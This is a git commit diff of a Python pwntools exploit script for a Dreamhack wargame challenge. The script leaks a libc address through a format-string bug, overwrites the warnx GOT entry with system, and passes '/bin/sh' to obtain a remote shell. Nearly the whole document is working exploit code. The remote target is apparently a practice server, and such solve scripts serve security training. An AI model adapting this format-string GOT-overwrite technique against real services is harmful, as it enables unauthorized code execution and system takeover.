ae883b00758d3cbd74c491beb23f457fb48f089a
baehunsang <hoonsang99@korea.ac.kr>
2021-03-28 01:31:39 +0900

    3/28

--- pwn/Dreamhack/string_solve/ex2.py
+++ pwn/Dreamhack/string_solve/ex2.py
@@ -1,45 +1,50 @@
-from pwn import *
+from pwn import*
 context.log_level = 'debug'
 def send_payload(payload):
     print r.sendline(payload)
 
-r = remote("host1.dreamhack.games", 8377)
+r = remote("host1.dreamhack.games", 22763)
 libc = ELF('./libc.so.6')
 e = ELF('./string')
 
 printf_got = e.got['printf']
 warnx_got = e.got['warnx']
 printf_offset = libc.symbols['printf']
-one_gadget = 0x3a80c
+system_offset = libc.symbols['system']
+bss = e.bss()
 payload = ""
 payload += p32(printf_got)
 payload += '%x%x%x%x.%s'
 
-print r.recvuntil("> ")
+r.recvuntil("> ")
+
 r.sendline("1")
-print r.recvuntil("Input: ")
+r.recvuntil("Input: ")
+
 r.sendline(payload)
-print r.recvuntil("> ")
+r.recvuntil("> ")
+
 r.sendline("2")
-print r.recvuntil(".")
+r.recvuntil(".")
 printf_libc = u32(r.recv(4))
 print hex(printf_libc)
 libc_base = printf_libc - printf_offset
-one_gadget_libc = libc_base + one_gadget
-
+system_addr = libc_base + system_offset
 fmt = FmtStr(send_payload, offset = 5)
 
-print r.recvuntil('> ')
+r.recvuntil('> ')
+
 r.sendline('1')
-print r.recvuntil('Input: ')
+r.recvuntil('Input: ')
 
-fmt.write(warnx_got, one_gadget_libc)
+fmt.write(warnx_got, system_addr)
 fmt.execute_writes()
-
-print hex(one_gadget_libc)
-print r.recvuntil('> ')
+r.recvuntil('> ')
 r.sendline('2')
-print r.recvuntil('> ')
+r.recvuntil('> ')
+r.sendline('1')
+r.recvuntil('Input: ')
+r.sendline('/bin/sh')
+r.recvuntil('> ')
 r.sendline('2')
 r.interactive()
-
